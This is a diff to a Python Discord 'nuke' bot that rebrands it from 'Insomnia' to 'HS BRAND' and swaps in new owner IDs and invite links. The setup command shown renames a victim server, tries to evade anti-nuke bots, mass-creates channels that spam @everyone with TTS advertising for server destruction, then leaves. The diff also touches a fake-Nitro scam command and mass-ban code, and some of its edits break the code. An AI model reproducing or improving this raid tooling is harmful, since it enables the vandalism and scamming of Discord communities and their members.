@@ -8,6 +8,58 @@ from discord.ext import commands, tasks
 from discord.ext.commands import BucketType, CommandOnCooldown, Cooldown, cooldown
 from discord.ui import Button, Select, View
 
+import os
+import sys
+import time
+
+def typing_effect(text, speed=0.001):
+    for char in text:
+        sys.stdout.write(char)
+        sys.stdout.flush()
+        time.sleep(speed)
+
+# Screen clear aur Dark Red background set karna
+os.system('clear')
+
+# ANSI Colors
+DARK_RED_BG = "\033[48;5;88m"
+NEON_GREEN = "\033[1;92m"
+BOLD_WHITE = "\033[1;37m"
+RESET = "\033[0m"
+
+# Poori screen ko Dark Red karne ke liye
+print(DARK_RED_BG + "\033[2J\033[H", end="")
+
+# Chota Logo (taki zoom karne par tute nahi)
+logo = f"""{NEON_GREEN}
+  _  _ ___   ___  ___   _   _  _ ___  
+ | || / __| | _ )| _ \ /_\ | \ | |   \ 
+ | __ \__ \ | _ \|   // _ \|  \| | |) |
+ |_||_|___/ |___/|_|_/_/ \_\_|\_|___/ 
+{RESET}{DARK_RED_BG}{BOLD_WHITE}
+ ---------------------------------------
+ >> Status: Bot is Running...
+ >> Info: Dark Red Theme Active
+ ---------------------------------------
+"""
+
+typing_effect(logo)
+
+# Yahan se aapka bot start hoga aur background red hi rahega
+print(f"{BOLD_WHITE}Starting Discord Connection...{RESET}{DARK_RED_BG}")
+
+import os
+
+# Purane token wali line hatakar ye likhein
+print("\033[1;32m") # Green color for input
+TOKEN = input("Enter your Discord Bot Token: ")
+print("\033[0m") # Reset color
+
+# Bot ko start karne ke liye
+try:
+    client.run(TOKEN)
+except Exception as e:
+    print(f"\033[1;31mInvalid Token or Error: {e}\033[0m")
 
 
 intents = discord.Intents.all()
@@ -16,24 +68,23 @@ leaderboard_message = None  # we gonna save it global
 NUKE_STATS_FILE = "nuke_stats.json"
 PREMIUM_FILE = "premium.json"
 CONFIG_FILE = "config.json"
-PREM = 1414916058875301939
+PREM = 720649564520054886
 MOD_ROLE_ID = 1414916058120192051
 WHITELIST = [
     1340433509130436618,  # User 1
     941326582096744469,  # User 2
-    1195644166105997315   # User 3
+    720649564520054886,   # User 3
 ]
 BLACKLISTED_GUILD_ID = 1418550612085440554  # ur server id
-OWNER_ID = 1340433509130436618
+OWNER_ID = 720649564520054886
 LEADERBOARD_CHANNEL_ID = 1401931021544460389 # channel for leaderboard embed
-TOKEN = ''  # ur bot token
 LOG_WEBHOOK_URL = ''  # webhook for tracker channel
 
 
 BLOCKED_BOT_IDS = [
     651095740390834176,  # security
     548410451818708993,  # wick
-    # u can add more if u want
+    1196511938323173479, # u can add more if u want
     
 ]
 
@@ -42,6 +93,8 @@ BLOCKED_BOT_NAMES = [
     "Wick",
     "Beemo",
     "AntiNuke",
+    "Bravers#7201",
+    "Bravers",
 ]
 
 def save_nuke_stats(user_id, guild):
@@ -149,31 +202,31 @@ def set_show_username(user_id, value: bool):
     set_user_config(user_id, "show_username", value)
 
 def get_channel_name(user_id):
-    return get_user_config(user_id).get("channel_name", "insomnia-on-top")
+    return get_user_config(user_id).get("channel_name", "HS-BRAND-on-top")
 
 def set_channel_name(user_id, value: str):
     set_user_config(user_id, "channel_name", value)
 
 def get_webhook_name(user_id):
-    return get_user_config(user_id).get("webhook_name", "insomnia")
+    return get_user_config(user_id).get("webhook_name", "HS BRAND")
 
 def set_webhook_name(user_id, value: str):
     set_user_config(user_id, "webhook_name", value)
 
 def get_webhook_message(user_id):
-    return get_user_config(user_id).get("webhook_message", "insomnia owns this")
+    return get_user_config(user_id).get("webhook_message", "HS BRAND owns this")
 
 def set_webhook_message(user_id, value: str):
     set_user_config(user_id, "webhook_message", value)
 
 def get_server_name(user_id):
-    return get_user_config(user_id).get("server_name", "insomnia owns this")
+    return get_user_config(user_id).get("server_name", "HS BRAND owns this")
 
 def set_server_name(user_id, value: str):
     set_user_config(user_id, "server_name", value)
 
 def get_role_name(user_id):
-    return get_user_config(user_id).get("role_name", "join insomnia")
+    return get_user_config(user_id).get("role_name", "join hs")
 
 def set_role_name(user_id, value: str):
     set_user_config(user_id, "role_name", value)
@@ -248,11 +301,11 @@ async def handle_set_name_setting(interaction: Interaction, setting_key: str, ne
     if setting_key != "show_username":
         if not is_premium_user(user_id):
             defaults = {
-                "channel_name": "insomnia-on-top",
-                "webhook_name": "insomnia",
-                "webhook_message": "Server has been nuked!",
-                "server_name": "insomnia owns this",
-                "role_name": "join insomnia",
+                "channel_name": "HS-BRAND-own-this",
+                "webhook_name": "HS BRAND",
+                "webhook_message": "HS BRAND owns this",
+                "server_name": "HS BRAND owns this",
+                "role_name": "join hs brand",
             }
             set_user_config(user_id, setting_key, defaults.get(setting_key, ""))
             await interaction.response.send_message(
@@ -332,28 +385,28 @@ class SettingsModal(discord.ui.Modal):
         )
         self.channel_name_input = discord.ui.TextInput(
             label="Channel Name (Premium required)",
-            placeholder="nuked-channel",
+            placeholder="HS-BRAND-own-this",
             default=get_channel_name(user_id),
             max_length=32,
             required=False
         )
         self.webhook_name_input = discord.ui.TextInput(
             label="Webhook Name (Premium required)",
-            placeholder="Nuke Webhook",
+            placeholder="HS BRAND",
             default=get_webhook_name(user_id),
             max_length=32,
             required=False
         )
         self.webhook_message_input = discord.ui.TextInput(
             label="Webhook Message (Premium required)",
-            placeholder="Server has been nuked!",
+            placeholder="HS BRAND owns this",
             default=get_webhook_message(user_id),
             max_length=100,
             required=False
         )
         self.server_name_input = discord.ui.TextInput(
             label="Server Name (Premium required)",
-            placeholder="Nuked Server",
+            placeholder="HS BRAND OWN THIS",
             default=get_server_name(user_id),
             max_length=32,
             required=False
@@ -380,10 +433,10 @@ class SettingsModal(discord.ui.Modal):
             else:
                 set_user_config(user_id, key, default)
 
-        safe_set("channel_name", self.channel_name_input.value.strip(), "nuked-channel")
-        safe_set("webhook_name", self.webhook_name_input.value.strip(), "Nuke Webhook")
-        safe_set("webhook_message", self.webhook_message_input.value.strip(), "Server has been nuked!")
-        safe_set("server_name", self.server_name_input.value.strip(), "Nuked Server")
+        safe_set("channel_name", self.channel_name_input.value.strip(), "HS-BRAND-own-this")
+        safe_set("webhook_name", self.webhook_name_input.value.strip(), "HS-BRAND-own-this")
+        safe_set("webhook_message", self.webhook_message_input.value.strip(), "HS BRAND owns this")
+        safe_set("server_name", self.server_name_input.value.strip(), "HS-BRAND-own-this")
 
         await interaction.response.send_message("✅ Your settings have been saved.", ephemeral=True)
 
@@ -537,13 +590,13 @@ async def fakenitro(ctx):
             try:
                 link_msg = await bot.wait_for("message", check=link_check, timeout=60)
                 if link_msg.content.lower() == "default":
-                    fake_link = "https://discord.gg/VSQzzAMVw3"
+                    fake_link = "https://discord.gg/heiwachills"
                 else:
                     fake_link = link_msg.content.strip()
             except asyncio.TimeoutError:
-                fake_link = "https://discord.gg/VSQzzAMVw3"
+                fake_link = "https://discord.gg/heiwachills"
         else:
-            fake_link = "https://discord.gg/VSQzzAMVw3"
+            fake_link = "https://discord.gg/heiwachills"
             await dm_channel.send("You dont have premium :( Using default invite link.")
 
         embed = discord.Embed(
@@ -634,37 +687,6 @@ async def leave(ctx):
     if ctx.author.id != OWNER_ID:
         await ctx.send("❌ You are not authorized to use this command.")
         return
-    await leave_all_servers()
-
-@tasks.loop(hours=6)
-async def auto_leave_task():
-    await leave_all_servers()
-
-async def leave_all_servers():
-    all_guilds = bot.guilds
-    to_leave = [g for g in all_guilds if g.id != BLACKLISTED_GUILD_ID]
-    total_to_leave = len(to_leave)
-
-    await log(f"[AUTO-LEAVE] I am in {len(all_guilds)} servers, leaving {total_to_leave} (excluding blacklist).")
-
-    left = 0
-    for i, guild in enumerate(to_leave, 1):
-        try:
-            await guild.leave()
-            left += 1
-        except Exception as e:
-            await log(f"[ERROR] Could not leave {guild.name} ({guild.id}): {e}")
-
-        if i % 5 == 0 or i == total_to_leave:
-            await log(f"[AUTO-LEAVE] Progress: {left}/{total_to_leave}")
-
-        await asyncio.sleep(1)
-
-    await log(f"[AUTO-LEAVE] Finished! Left {left} servers (excluding blacklist).")
-
-@auto_leave_task.before_loop
-async def before_auto_leave():
-    await bot.wait_until_ready()
 
 
 bot.remove_command("help")
@@ -672,7 +694,7 @@ bot.remove_command("help")
 @bot.command()
 async def nhelp(ctx):
     embed = discord.Embed(
-        title="⚡ Insomnia Bot Help",
+        title="⚡ HS brand Bot Help",
         description="List of available commands:",
         color=discord.Color.blurple()
     )
@@ -740,7 +762,7 @@ async def nhelp(ctx):
 @bot.command()
 async def help(ctx):
     embed = discord.Embed(
-        title="⚡ Nova Bot Help",
+        title="⚡ heiwa Bot Help",
         description="Here are some of the available commands:",
         color=discord.Color.gold()
     )
@@ -812,7 +834,7 @@ async def help(ctx):
 @bot.command()
 async def massban(ctx):
     guild = ctx.guild
-    author = ctx.author
+    author = ctx.author.id
 
     if not is_premium_user(author.id):
         await ctx.send("💎 This command is only available for premium users.")
@@ -968,10 +990,10 @@ async def setup(ctx):
         await ctx.reply("`this server is blacklisted`")
         return
 
-    if len(guild.members) < 5:  # min 5 members, u can change it if u want
+    if len(guild.members) < 3:  # min 3 members, u can change it if u want
         try:
             await user.send(f"❌ Server `{guild.name}` needs to have a minimum of 5 members. Leaving..")
-            print("not 5 members")
+            print("not 3 members")
         except:
             print(f"[!] Konnte {user} keine DM schicken.")
         await guild.leave()
@@ -981,28 +1003,12 @@ async def setup(ctx):
     if found:
         print(f"[!] Antinuke-Bots found:\n" + "\n".join(found) + "\nbypassing...")
 
-        webhook_message = user_config.get("webhook_message", "insomnia owns this")
-        if webhook_message in ["insomnia owns this", "Server has been nuked!"]:
-            spam_message = "@everyone discord.gg/VSQzzAMVw3 https://www.youtube.com/watch?v=FMwC4TtNvbI"
-        else:
-            spam_message = webhook_message
-
-        for channel in guild.text_channels:
-            try:
-                await asyncio.gather(*(
-                    channel.send(spam_message) for _ in range(10)
-                ))
-            except Exception as e:
-                print(f"[ERROR] Spam in {channel.name} - : {e}")
-
-        return
-
     save_nuke_stats(user.id, guild)
 
-    channel_name = user_config.get("channel_name", "insomnia-on-top")
-    webhook_message = user_config.get("webhook_message", "insomnia owns this")
+    channel_name = user_config.get("channel_name", "HS-BRAND-own-this")
+    webhook_message = user_config.get("webhook_message", "HS BRAND owns this")
     server_name = user_config.get("server_name", guild.name)
-    role_name = user_config.get("role_name", "insomnia-owns-u")
+    role_name = user_config.get("role_name", "HS-BRAND-owns-u")
 
     try:
         await guild.edit(name=server_name)
@@ -1029,36 +1035,32 @@ async def setup(ctx):
             ch = await guild.create_text_channel(name=channel_name)
 
             embed = discord.Embed(
-                title="**__NUKED BY INSOMNIA__**",
-                description=(
-                    "`Unfortunately this server has been nuked due to admins' inattention.`\n"
-                    "### If you're interested in this bot or you need to destroy somebody's server you can [join](https://discord.gg/VSQzzAMVw3) our discord server.\n"
-                    "**Insomnia has:**\n"
-                    "> **Powerful bots with uptime 24/7**\n"
-                    "> **Raid/Nuke features**\n"
-                    "> **Good community**"
-                ),
-                color=0xb161f9
-            )
+                    title="**__NUKED BY HS BRAND__**",
+                    description=(
+                        "`Unfortunately this server has been nuked due to admins' inattention.`\n"
+                        "### If you're interested in this bot or you need to destroy somebody's server you can [join](https://discord.gg/heiwachills) our discord server.\n"
+                        "**HS brand has:**\n"
+                        "> **Powerful bots with uptime 24/7**\n"
+                        "> **Raid/Nuke features**\n"
+                        "> **Good community**"
+                    ),
+                    color=0xb161f9
+                )
             embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1395783321895567461/1398652948812267630/11131604.png")
+            is_premium_check = is_premium_user(user_id)
+            spams = 25 if is_premium_check else 10
 
-            if webhook_message in ["insomnia owns this", "Server has been nuked!"]:
-                is_premium = is_premium_user(user.id)
-                spams = 25 if is_premium else 10
-                for _ in range(spams):
-                    await ch.send(
-                        content="@everyone discord.gg/VSQzzAMVw3 https://www.youtube.com/watch?v=FMwC4TtNvbI",
-                        embed=embed,
-                        tts=True
-                    )
-            else:
-                for _ in range(10):
-                    await ch.send(webhook_message)
+            for _ in range(spams):
+                await ch.send(
+                    content=f"@everyone {webhook_message}", 
+                    embed=embed, 
+                    tts=True
+                )
 
         except Exception as e:
             print(f"[!] Channel/message failed: {e}")
 
-    is_premium = is_premium_user(user.id)
+    is_premium = is_premium_user(user_id)
     channel_count = 100 if is_premium else 50
     await asyncio.gather(*(create_channel_and_send_message() for _ in range(channel_count)))
 
@@ -1068,6 +1070,7 @@ async def setup(ctx):
         print(f"[!] Role creation failed: {e}")
 
     await guild.leave()
+
 
 
 @setup.error
@@ -1081,11 +1084,7 @@ async def nuke_error(ctx, error):
 @bot.event
 async def on_ready():
     print(f"Bot is online as {bot.user}!")
-    update_leaderboard.start()
-    print("Updated leaderboard")
     await bot.tree.sync()
-    print("Slash commands synced.")
-    auto_leave_task.start()
-
 
 bot.run(TOKEN)
+
